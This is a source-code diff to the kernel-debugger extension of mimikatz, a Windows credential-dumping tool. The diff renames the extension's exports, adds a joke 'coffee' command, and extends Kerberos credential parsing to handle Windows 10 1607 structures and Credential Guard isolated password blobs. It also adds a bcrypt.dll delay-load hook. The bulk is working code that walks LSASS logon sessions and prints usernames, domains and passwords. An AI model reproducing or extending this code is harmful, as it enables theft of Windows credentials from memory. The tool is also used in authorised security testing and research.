@@ -15,17 +15,12 @@ EXT_API_VERSION g_ExtApiVersion = {5 , 5 ,
 , 0};
 USHORT NtBuildNumber = 0;
 
-LPEXT_API_VERSION WDBGAPI ExtensionApiVersion (void)
+LPEXT_API_VERSION WDBGAPI kdbg_ExtensionApiVersion(void)
 {
 	return &g_ExtApiVersion;
 }
 
-VOID CheckVersion(void)
-{
-	return;
-}
-
-VOID WDBGAPI WinDbgExtensionDllInit(PWINDBG_EXTENSION_APIS lpExtensionApis, USHORT usMajorVersion, USHORT usMinorVersion)
+VOID WDBGAPI kdbg_WinDbgExtensionDllInit(PWINDBG_EXTENSION_APIS lpExtensionApis, USHORT usMajorVersion, USHORT usMinorVersion)
 {
 	ExtensionApis = *lpExtensionApis;
 	NtBuildNumber = usMinorVersion;
@@ -80,7 +75,12 @@ const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
 	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonServer)},
 };
 
-DECLARE_API(mimikatz)
+DECLARE_API(kdbg_coffee)
+{
+	dprintf("\n    ( (\n     ) )\n  .______.\n  |      |]\n  \\      /\n   `----'\n");
+}
+
+DECLARE_API(kdbg_mimikatz)
 {
 	ULONG_PTR pInitializationVector = 0, phAesKey = 0, ph3DesKey = 0, pLogonSessionList = 0, pLogonSessionListCount = 0, pSecData = 0, pDomainList = 0;
 	PLIST_ENTRY LogonSessionList;
@@ -235,6 +235,7 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 	BOOL isNull = FALSE;
 	PBYTE msvCredentials;
 	const MSV1_0_PRIMARY_HELPER * pMSVHelper;
+	PLSAISO_DATA_BLOB blob = NULL;
 
 	if(mesCreds)
 	{
@@ -366,7 +367,29 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 			if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10)
 				mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL) mesCreds)->Password;
 			else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10_1607)
-				mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->Password;
+			{
+				switch(((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->type)
+				{
+				case 1:
+					mesCreds->Password.Length = mesCreds->Password.MaximumLength = 0;
+					mesCreds->Password.Buffer = NULL;
+					buffer.Length = buffer.MaximumLength = (USHORT) ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->IsoPassword.StructSize;
+					buffer.Buffer = (PWSTR) ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->IsoPassword.isoBlob;
+					if(kull_m_string_getDbgUnicodeString(&buffer))
+						blob = (PLSAISO_DATA_BLOB) buffer.Buffer;
+					//break;
+				case 0:
+					// no creds
+					mesCreds->Password.Length = mesCreds->Password.MaximumLength = 0;
+					mesCreds->Password.Buffer = NULL;
+					break;
+				case 2:
+					mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->Password;
+					break;
+				default:
+					dprintf("Unknown version in Kerberos credentials structure\n");
+				}
+			}
 
 			if(mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
 			{
@@ -409,6 +432,12 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 							dprintf("%wZ", password ? password : &uNull);
 					}
 					else kull_m_string_dprintf_hex(password->Buffer, password->Length, 1);
+
+					if(blob)
+					{
+						kuhl_m_sekurlsa_genericLsaIsoOutput(blob);
+						LocalFree(blob);
+					}
 				}
 
 				if(username)
@@ -735,3 +764,14 @@ void kuhl_sekurlsa_dpapi_backupkeys()
 		}
 	}
 }
+
+FARPROC WINAPI delayHookFailureFunc (unsigned int dliNotify, PDelayLoadInfo pdli)
+{
+    if((dliNotify == dliFailLoadLib) && (_stricmp(pdli->szDll, "bcrypt.dll") == 0))
+		RaiseException(ERROR_DLL_NOT_FOUND, 0, 0, NULL);
+    return NULL;
+}
+#ifndef _DELAY_IMP_VER
+const
+#endif
+PfnDliHook __pfnDliFailureHook2 = delayHookFailureFunc;
